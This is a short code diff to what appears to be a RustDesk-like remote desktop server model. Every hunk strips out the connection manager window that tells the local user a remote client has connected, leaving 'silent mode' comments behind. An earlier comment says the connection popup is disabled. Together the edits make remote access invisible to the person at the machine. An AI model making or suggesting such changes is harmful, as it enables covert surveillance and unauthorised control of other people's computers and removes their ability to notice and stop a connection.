@@ -170,7 +170,7 @@ class ServerModel with ChangeNotifier {
             }
           } else {
             _zeroClientLengthCounter = 0;
-            if (!hideCm) showCmWindow();
+            // silent mode: do not show CM window on client connect
           }
         }
       }
@@ -541,9 +541,8 @@ class ServerModel with ChangeNotifier {
     if (desktopType == DesktopType.cm) {
       if (_clients.isEmpty) {
         hideCmWindow();
-      } else if (!hideCm) {
-        showCmWindow();
       }
+      // silent mode: do not show CM window when clients connect
     }
     if (_clients.length != oldClientLenght) {
       notifyListeners();
@@ -598,13 +597,7 @@ class ServerModel with ChangeNotifier {
     Future.delayed(Duration.zero, () async {
       // popup disabled: connection via password only
     });
-    // Only do the hidden task when on Desktop.
-    if (client.authorized && isDesktop) {
-      cmHiddenTimer = Timer(const Duration(seconds: 3), () {
-        if (!hideCm) windowManager.minimize();
-        cmHiddenTimer = null;
-      });
-    }
+    // silent mode: window stays hidden, no minimize needed
     parent.target?.chatModel
         .updateConnIdOfKey(MessageKey(client.peerId, client.id));
   }
